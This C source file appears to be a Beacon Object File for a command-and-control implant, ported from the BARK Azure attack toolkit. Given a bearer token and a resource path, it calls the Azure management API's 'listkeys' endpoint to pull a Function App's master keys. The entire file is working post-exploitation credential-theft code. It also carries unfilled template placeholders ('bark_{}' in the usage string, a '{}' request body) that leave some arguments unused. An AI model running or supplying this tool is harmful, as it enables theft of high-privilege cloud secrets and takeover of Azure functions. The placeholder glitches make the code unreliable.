/*
 * get_azure_function_app_master_keys.c — BARK BOF
 * Get-AzureFunctionAppMasterKeys — Get master keys for a Function App
 *
 * Args : token, functionAppPath
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[2048];
    static char bodyBuf[4096];
    LPWSTR widePath = NULL;
    char  *token = NULL;
    char  *functionAppPath = NULL;
    BeaconDataParse(&parser, args, alen);
    token = BeaconDataExtract(&parser, NULL);
    functionAppPath = BeaconDataExtract(&parser, NULL);
    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_{}" "\n", "<token> <functionAppPath>");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf), "{}", functionAppPath);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "%s/host/default/listkeys?api-version=2018-11-01", functionAppPath);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BarkPost(L"management.azure.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
